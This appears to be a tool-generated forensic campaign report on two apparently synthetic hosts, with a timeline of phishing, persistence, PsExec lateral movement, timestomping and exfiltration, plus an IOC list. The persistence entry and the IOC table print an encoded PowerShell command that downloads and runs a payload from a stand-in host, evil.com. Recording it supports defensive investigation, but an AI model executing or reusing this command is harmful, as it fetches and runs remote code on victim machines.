# 🦁 Operation Chimera: Campaign Investigation Report

**Generated:** 2025-12-31 09:07
**Scope:** 2 Hosts Integrated

## 1. Campaign Executive Summary
本レポートは、複数端末にまたがる攻撃活動（Campaign）を統合分析した結果です。

### 🔗 Attack Flow (Lateral Movement)
- 🚨 **WORKSTATION-01 (Confirmed Lateral Activity)**
- 🚨 **FILESERVER-99 (Confirmed Lateral Activity)**
### 💻 Host Verdicts
| Hostname | Verdict Flags |
|---|---|
| **WORKSTATION-01** | [LATERAL_MOVEMENT_CONFIRMED] |
| **FILESERVER-99** | [LATERAL_MOVEMENT_CONFIRMED] |

## 2. Integrated Timeline (All Hosts)
| Time (UTC) | Host | User | Category | Event Summary | Source |
|---|---|---|---|---|---|
| 2024-12-30 10:00:00 | **FILESERVER-99** | System | DROP | File Creation: Conf.7z | Chronos |
| 2025-12-30 10:04:59 | **WORKSTATION-01** | UserA | DROP | File Creation (Inferred): wscript.exe | Inferred from High-Confidence Execution |
| 2025-12-30 10:05:00 | **WORKSTATION-01** | UserA | EXEC | Suspicious: PHISHING_CANDIDATE | Hercules (Pandora) |
| 2025-12-30 10:05:00 | **WORKSTATION-01** | System/Unknown | ANTI | File Deletion: Invoice.js | Pandora (USN) |
| 2025-12-30 10:05:00 | **WORKSTATION-01** | UserA | EXEC | Suspicious: EXECUTION | Hercules (EventLog) |
| 2025-12-30 10:09:59 | **WORKSTATION-01** | UserA | DROP | File Creation (Inferred): powershell.exe | Inferred from High-Confidence Execution |
| 2025-12-30 10:10:00 | **WORKSTATION-01** | System/Unknown | INIT | Script Exec: ATTACK_SIG | Sphinx (PowerShell) |
| 2025-12-30 10:10:00 | **WORKSTATION-01** | UserA | EXEC | Suspicious: PERSISTENCE | Hercules (Registry) |
| 2025-12-30 10:44:59 | **WORKSTATION-01** | UserA | DROP | File Creation (Inferred): psexec.exe | Inferred from High-Confidence Execution |
| 2025-12-30 10:45:00 | **WORKSTATION-01** | UserA | EXEC | Suspicious: LATERAL_MOVEMENT | Hercules (EventLog) |
| 2025-12-30 10:45:00 | **FILESERVER-99** | System/Unknown | ANTI | File Deletion: PSEXESVC.exe | Pandora (USN) |
| 2025-12-30 10:45:00 | **FILESERVER-99** | System/Inferred | DROP | Lifecycle Trace [Activity]: PSEXESVC.exe | Nemesis (USN) |
| 2025-12-30 10:45:10 | **FILESERVER-99** | System/Unknown | EXEC | Suspicious: LATERAL_TOOL | Hercules (System) |
| 2025-12-30 10:50:00 | **FILESERVER-99** | System/Unknown | EXEC | Suspicious: TIMESTOMP | Hercules (System) |
| 2025-12-30 10:54:59 | **FILESERVER-99** | System/Unknown | DROP | File Creation (Inferred): curl.exe | Inferred from High-Confidence Execution |
| 2025-12-30 10:55:00 | **FILESERVER-99** | System/Unknown | EXEC | Suspicious: DATA_EXFIL | Hercules (System) |
| None | **WORKSTATION-01** | System | PERSIST | Persistence: powershell.exe -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQAJwApAA== | AION (Persistence) |

## 3. Global IOC List (Deduplicated)
### 📂 Consolidated File IOCs
| File Name | SHA1 | SHA256 | Full Path |
|---|---|---|---|
| `powershell.exe -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQAJwApAA==` | `N/A` | `N/A` | `powershell.exe -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQAJwApAA==` |
| `PSEXESVC.exe` | `N/A (Deleted)` | `N/A (Deleted)` | `C:\Windows\\PSEXESVC.exe` |
| `Conf.7z` | `N/A (Timestomp)` | `N/A (Timestomp)` | `C:\Data\Conf.7z\Conf.7z` |

### 🌐 Consolidated Network IOCs
| Remote Endpoint |
|---|
| `192.168.1.20:445 (psexec.exe)` |

---
*Fused by SkiaHelios Chimera v1.2*